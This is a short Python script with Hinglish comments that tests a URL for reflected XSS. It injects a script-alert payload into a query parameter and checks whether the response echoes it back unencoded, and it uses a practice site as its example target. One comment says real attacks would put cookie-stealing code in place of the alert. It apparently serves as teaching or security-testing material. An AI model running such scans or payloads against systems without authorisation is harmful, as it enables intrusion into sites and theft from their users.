import requests
import sys

def test_xss(url):
    print(f"\n[*] Bhai, checking for Reflected XSS at: {url}")
    
    # The Classic XSS Payload
    # Yeh ek simple JavaScript alert box banata hai. Real hacking mein hum yahan cookie churaane ka code daalte hain.
    payload = "<script>alert('SUDOSAMMI_XSS_TEST')</script>"
    
    # Payload ko target URL ke parameter mein add kar rahe hain
    target_url = f"{url}{payload}"
    print(f"[*] Firing Payload: {payload}\n")
    
    try:
        # GET request bhej rahe hain
        response = requests.get(target_url, timeout=5)
        
        # Hacker Logic: Agar humara exact payload response.text (source code) mein 
        # wapas aa gaya bina kisi HTML encoding ke, toh target VULNERABLE hai!
        if payload in response.text:
            print("[+] BOOM! 🎯 Reflected XSS Vulnerability Found!")
            print("[+] The server reflected our JavaScript without filtering it!")
        else:
            print("[-] No XSS found. The target is either filtering input or encoding it safely.")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Arre yaar, connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xss_tester.py <target_url_with_parameter>")
        print("Example: python3 xss_tester.py 'http://testphp.vulnweb.com/listproducts.php?cat='")
        sys.exit(1)
        
    target = sys.argv[1]
    test_xss(target)
